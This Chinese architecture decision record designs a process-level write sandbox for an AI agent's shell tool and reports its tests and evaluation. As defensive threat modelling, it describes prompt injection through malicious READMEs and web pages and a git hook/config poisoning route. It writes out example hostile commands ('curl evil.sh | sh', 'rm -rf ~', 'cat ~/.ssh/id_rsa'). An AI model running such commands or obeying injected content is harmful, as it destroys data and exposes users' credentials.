# 决策记录 · run_command 进程级沙箱（workspace-write 隔离，048）

> 确认弹窗不再是唯一防线：shell 通道收缩到「全机读、写限锚点」。
> 返回 [architecture.md](../architecture.md)

- **状态**：已批准（2026-09-26，用户在本轮四项 AskUserQuestion 裁定：①平台派发抽象层 ②网络放行 ③.git 可写+围死 hooks·config ④无后端降级放行+审计打标）
- **前置**：[017](017-s3-security.md)（威胁模型：不可信内容经模型之手变动作）、[019](019-s4b-terminal-confirm.md)（确认缝+白名单，自记 pytest 让步）、[030](030-s6a-worktree-isolation.md)（副本 commit 不经 run_command）、[046](046-frozen-real-task-eval.md)（冻结评测与刺 #6）

## 背景与动机

防线现状分层（046 后）：

| 通道 | 防线 |
|---|---|
| files.py 四工具 | 应用层围栏（resolve 必须在 root 内）+ 敏感黑名单（读都不行） |
| fetch_web | SSRF 栅栏（019/020） |
| **run_command** | **只有确认缝**：白名单免确认，其余弹窗——批准即全机权限 |

shell 通道是唯一没有进程级边界的高危面，三个结构性弱点：

1. **单次批准 = 全机权限**：`make install`、`rm -rf ~`、`curl evil.sh | sh` 形态不同，批准后后果相同。确认的语义被默认成了「我信任这条命令可能做的一切」。
2. **019 自记的让步**：`python -m pytest` 免确认 = 免确认的任意代码执行通道（pytest 可执行任意逻辑）。当时硬线只有审计+弹窗。
3. **确认疲劳是攻击面**：白名单存在的理由就是防「狼来了」；但弹窗频次越高，单次批准的含金量越低。

威胁模型（017）：恶意 README/网页不需要攻破任何代码，只需诱导模型点一条命令——注入场景 i1/i2 诱导的正是 run_command。原始指令的 25% 安全边界明确要求「确认弹窗不再是唯一防线」。

附带收益（刺 #6 素材）：沙箱只加在 full 臂（baseline_agent.py 是独立 subprocess，不经 terminal.py）——加硬注入载荷后若 full 臂挡住而 bash 臂没挡住，「项目机制有没有贡献」第一次有了直接证据通道。

## 地面真值（调研 + 本机探测，先于设计）

**本机探测（2026-09-26，macOS）**：
- `sandbox-exec` 可用；写围栏语义实测：profile 下写 workspace 外返回 `Operation not permitted`、文件未创建
- 一刀切 `(deny default)` 会把 shell 启动都掐死（getcwd/dyld 基础操作被拒）→ 实战 profile 必须是「放读、放基础操作，只限写」
- EPERM 错误串经 `_run_command` 的 exit code + stderr 如实回传——模型可看懂「写入被沙箱拒绝」并换方案，**错误通道现成，零新增**
- seatbelt 是进程域，fork/exec 全继承：`curl x | sh` 整条链在围栏内
- 路径坑已踩：`/tmp` 是 `/private/tmp` 的 symlink，subpath 规则必须给 resolve 后真实路径；TMPDIR（`/var/folders/...`）同理——python/pytest 起不来的头号原因

**业界格局（2025-09 ~ 2026-09 调研，三家 + 一个开源库）**：
- **Codex CLI**（OpenAI）：macOS=Seatbelt、Linux=Landlock+seccomp；**Windows 原本无沙箱**（用户二选一：每条确认 / Full Access 裸奔），2026-05 专门组团队自研 restricted-write-token 方案才补上（AppContainer/Windows Sandbox/MIC 均被否），安装文档的 Windows 要求至今仍是 WSL2。默认语义：读几乎全机、写限 workspace、网络默认禁。
- **Claude Code**（Anthropic）：macOS=Seatbelt、Linux/WSL2=bubblewrap；**原生 Windows 明确不支持→WSL2**。语义收敛于 **「Read All, Write CWD」**（全机读除 deny 目录；写限工作目录+session temp+显式 add-dir）。两个值得抄的设计：`failIfUnavailable` 默认 false（沙箱不可用=降级+警告，正是本案裁定④的业界同款）；`allowUnsandboxedCommands` escape hatch（回退常规确认流）。凭证防护是**独立打包**：denyRead ~/.ssh、~/.aws + 网络代理域名白名单。官方 troubleshooting 提醒「plan for a break-in week」（头一周 EPERM 调优期）。
- **Gemini CLI**（Google）：**真·跨平台的答案是容器**（Docker/Podman，workspace 挂载到容器内相同绝对路径）；macOS 另有 Seatbelt，默认 `permissive-open` = 写限项目目录 + 网络放行（与本案语义一字不差）。
- **sandbox-runtime (srt)**：Anthropic 开源的同款原语打包，仍无原生 Windows。
- **结论**：业界不存在「单一实现覆盖全平台」的轻量方案。「跨平台」的诚实形态只有一种：**抽象层 + 平台后端 + 无后端降级**（OpenAI 为一个 Windows 后端投了一个团队数月）。

**代码层查证（本案设计前提）**：
- S6a 副本的 commit/merge 是 [worktree.py](../../src/agent/tools/worktree.py) 的 `_git()` 内部 subprocess，**不经 run_command 工具**——沙箱怎么围都不影响副本工作流；受影响的只有「模型经 run_command 手动跑 git」这一条路径
- git「解释执行任意命令」的入口全部收敛在两处：**`hooks/` 与 `config`**（`alias.*`、`core.sshCommand`、`core.pager`、`core.fsmonitor`、`include.path` 全在 config）——堵住这两处 = 堵死毒化面
- `.git` 是**跨边界延时执行**攻击面：沙箱内写毒 hook 当下无害，宿主日后以全权限跑 `git commit`/`git log` 时触发——空间围栏被「时间差 + 执行主体切换」绕过

## 选项与裁定

**方案形态**：
- **甲：平台派发抽象层（裁定）**——统一接口；macOS 后端=sandbox-exec（本机已验证）、Linux 后端=bubblewrap（有就启用）、Windows 第一版无后端→降级放行+审计打标。「不耦合系统」体现在抽象层与降级路径，不是单一实现。
- 乙：Docker/Podman 容器（否）——Gemini 路线，真跨平台一致；但容器引擎依赖、macOS 上 Docker 是 VM、评测与 server 工作流全要穿容器，违背最短启动。挂触发信号。
- 丙：只加强应用层校验（否）——对 shell=True 无效（命令不可解析，019 已裁定不在工具内做命令解析），等于放弃目标。

**.git 写权**：
- 甲：全围死（否）——最安全，但「用户明说 commit → agent 直接跑」的日常闭环被 EPERM 打断，每次都要用户手动接管。
- 乙：全可写，业界主流（否）——hooks/config 毒化面留着；且业界的敢写是和「网络白名单+凭证 denyRead」打包的纵深，本项目已裁不要这套打包，单抄结论不成立。
- **丙：可写 + 围死 hooks/config（裁定）**——commit/push 闭环保住；毒化入口（hooks/、config）进程级 deny。同等安全下成本最低，代价是每个后端实现「目录+文件」两级黑名单。

**网络出口**：**放行（裁定）**——本轮目标是 workspace-write 隔离；禁出会打断 pytest/pip/本地 server 联调。网络维度加硬挂触发信号另案。

**无后端环境**：**降级放行 + 审计打标（裁定）**——与 Claude Code `failIfUnavailable=false` 同款；不挡 Linux CI。硬失败（否）——Linux CI 上评测/测试全红，需额外豁免逻辑。

## 拍板

1. **抽象层落点**：新文件 `src/agent/tools/sandbox.py`——`detect_backend()`（darwin→sandbox-exec 存在性；linux→bwrap；其余→None）、`build_seatbelt_profile(root)`（渲染 .sb 字符串，按 root 内存缓存）、`wrap_command(command, *, root) -> (argv | None, backend)`。terminal.py `_run_command` 改走 wrap：有后端→`subprocess.run([sandbox-exec, -p, profile, /bin/sh, -c, command])`（shell=False）；无后端→现状 `shell=True` 原样。降级零行为差。
2. **seatbelt profile 语义**：`(deny default)` + 放基础操作（process-exec/fork、signal、mach-lookup、sysctl-read、ipc、network*）+ `(allow file-read*)`（全机读——denyRead 本轮不做）+ 写白名单四处：`root`（锚点 resolve 后）、TMPDIR（`tempfile.gettempdir()` 真实路径）、`/private/tmp`、`/private/var/folders`（per-user 缓存，构建工具刚需）。
3. **写黑名单**（profile 后置 deny，seatbelt 后规则胜出——顺序由测试钉住）：全部相对 root 渲染，与 files.py 黑名单**测试交叉同源**：`.env*`（regex 前缀）、`.git/hooks`（subpath）+ `.git/config`（literal，file-write* 覆盖创建与 rename 目标）、`data/memory`、`data/audit`、`data/vector_db`、`servers/sandbox`、`.venv`、`data/worktrees`。**data/worktrees 零特判**：主 agent root=workspace 时 `root/data/worktrees` 存在→deny 生效（主 agent 写不进副本区）；子 agent root=副本时该路径不存在→规则无害空转。
4. **审计打标**：registry 审计条目加 `sandbox` 字段（seatbelt/bwrap/off），批准拒绝都带——事后可统计「多少命令在围栏内跑」。
5. **确认缝语义不变**：白名单照样免确认（019 的 pytest 让步危险面压进围栏）；其余照样弹窗，但「批准」的语义从「批准全机权限」变成「批准在围栏内跑」。
6. **escape hatch 不做**：EPERM 如实回传模型换方案；必须写外部的命令（brew install 等）用户手动跑。触发信号：EPERM 误伤进入日常高频（break-in week 观察期）。
7. **开关**：`CORTEX_SANDBOX=auto`（默认）/`off`。auto=有后端启用、无则降级打标。

## 判定标准

1. seatbelt 后端下：写 root 内 OK；写 root 外 EPERM 且错误串回传；写 `.git/config` 与 `.git/hooks/x` EPERM；`git add+commit` 在 root 内正常闭环（objects/refs 可写）
2. TMPDIR 写 OK（python/pytest 起得来）；网络出站 OK；子进程继承（sh 套 sh 写外部仍 EPERM）
3. 降级：detect None 时行为同现状 + 审计 `sandbox=off`
4. 同源测试：files.py 黑名单每项都有 profile deny 规则（漂移即红）
5. 三门全绿；冻结集重跑 full 臂完成率/质量不显著退化（实机验证轮，是否跑另请用户裁定）

## 反方（预写）

1. **sandbox-exec 早被 deprecated**——不成立：Chromium 系/Codex/Claude Code/Gemini 四家共同在用，macOS 26 实测可用；抽象层隔离了替换成本（后端可换，接口不动）。
2. **确认弹窗够了**——不成立：确认疲劳是 019 自己立白名单的理由；019 自记的 pytest 让步 = 免确认任意代码执行，本案直接把这条让步的危险面压进围栏。
3. **Windows/Linux 无后端 = 白做**——不成立：降级 = 与现状相等，不少任何东西；Claude Code/Codex 初版同款；触发信号 = 真出现 Windows 用户。
4. **读全机留着，`cat ~/.ssh/id_rsa` 还是白名单免确认**——**成立，本轮不解决**：目标是 workspace-write；denyRead 凭证目录挂触发信号（沙箱上线后是小 diff：profile 加 deny file-read* 子路径）。
5. **worktree gitdir 穿透**：子 agent 在副本里手动 `git config` 写的是主 `.git/worktrees/<name>/config`，profile 相对副本 root 渲染 deny 不到——**成立，登记残留**：副本即用即焚（merge 后清理）窗口小、非只读 git 仍弹确认；堵法（解析 gitdir 加 deny）复杂度不配当前威胁。
   - 补注（2026-09-26 实现后）：穿透影响比预写时宽——不止 `git config`，子 agent 在副本里手动 `git commit` 同样 EPERM（objects/refs 落在主 `.git/`，不在副本 root 写白名单内）。行为变化但场景≈0：副本合并走 worktree.py 内部 subprocess 不经 run_command，方向是安全收益而非损失。

## 实现后实测补注（2026-09-26）

- **`git init`/`git clone` 在围栏内跑不了**：init 要写 `.git/config`（与反方预写的 `git config` 被拒同一机制——config 封印挡不住「git 自己写」和「agent 写」的区分，seatbelt 没有按进程/内容区分的能力），外加模板 hooks 拷贝。属丙案代价：**日常闭环（已有仓库 add/commit）不受影响**（test_git_config_denied_but_commit_loop_works 实测通过）；测试夹具在围栏外建仓；terminal description 已教模型「请用户代为执行」。若日后 EPERM 误伤高频，触发信号同 escape hatch 条目。
- **`/dev/null` 写需显式放行**：git 启动即打开 /dev/null，`(deny default)` 连设备写都挡——profile 白名单首条 `(allow file-write* (literal "/dev/null"))`（实测 git init 报 `could not open '/dev/null'` 后补上）。
- 实测结论：15/15 沙箱测试过、全量 563 过；写围栏正反对称、git 闭环、TMPDIR、网络放行、子进程继承、降级零行为差、审计打标（批准拒绝都带）全部如判定标准。

## 冻结集重跑（2026-09-26，用户裁定跑，同 047 先例）

- **full 8/10 质量 4.10 介入 5 次 396s ¥0.27（`frozen-20260926T125349Z.json`）｜bash 7/10 质量 3.90 介入 0 次 88s ¥0.20（`frozen-baseline-20260926T125619Z.json`）**——对比 047（full 8/10 4.20 ¥0.25｜bash 8/10 4.00 ¥0.23）：完成率/质量/成本**均不显著退化，判定标准第 5 条达标**。
- **零沙箱摩擦实证**：10 场景无一 fails 与 EPERM/写被挡相关；r6 的 3 次介入全是 run_command 正常确认弹窗（白名单外命令走既有确认流），非围栏误伤。full 臂日常工具流（pytest、写文件、git）在副本围栏内照常跑通。
- **full 两条红（r4/r6）都是 DSML 泄漏根因复发**（046/047 在档，根因明确不修）：r6 收官降级告知正常外发（「未能执行的工具调用：read_file」），走的正是 047 的诚实降级路径——047 的机制在实机中按设计工作。
- 注入三场景（i1/i2/i3）两臂再全过：载荷强度不足老问题（P0-8 在档「尚未真正检验」），本轮沙箱上线后结论不变——通过率仍来自基座抵抗力，围栏未获实战检验（这与「围栏挡写、断言证未写」的咬合设计一致：无副作用发生，围栏无出手时机）。
- bash 臂逐轮 9→8→7 的读数不驱动机制改动（046 纪律：n=1 单次出分禁止调机制）；r7 bash 红是设计性失败（无记忆臂测召回），r1/r4 红属 bash-only 能力短板与 judge 单采样噪声（046 在档）。

## 不做

网络隔离/域名白名单（已裁放行）；denyRead 凭证目录（触发信号：沙箱上线后首轮调优）；Windows/Linux 后端实现（检测留着，触发信号：真用户）；escape hatch（触发信号：EPERM 高频误伤）；容器后端（乙案已否决）；把 files.py 四工具塞进沙箱（应用层围栏已够，进程级重复）。

## 实现清单（批准后执行）

1. 新建 `src/agent/tools/sandbox.py`（后端检测 + profile 生成 + wrap_command，~150 行）
2. 改 `src/agent/tools/terminal.py`：`_run_command` 走 wrap；docstring 安全设计节补第 ⑤ 条
3. 改 `src/agent/tools/registry.py`：审计条目加 `sandbox` 字段（默认 off，terminal 注册时注入）
4. 新建 `tests/test_sandbox.py`：写围栏正反对称 / hooks·config EPERM + git commit 闭环 / TMPDIR / 网络 / 子进程继承 / 降级 / files.py 黑名单同源交叉断言
5. 回写 `docs/architecture.md`：安全章节分层表加进程级行、ADR 索引加 048、已知问题登记（`cat ~/.ssh` 白名单缺口 + gitdir 穿透残留）、版本 v0.79 → v0.80；roadmap P0-8 状态行补「配套：进程级写围栏已落地（048）」
6. 冻结集双臂重跑验证（实机出分，是否跑由用户裁定——047 先例是跑）
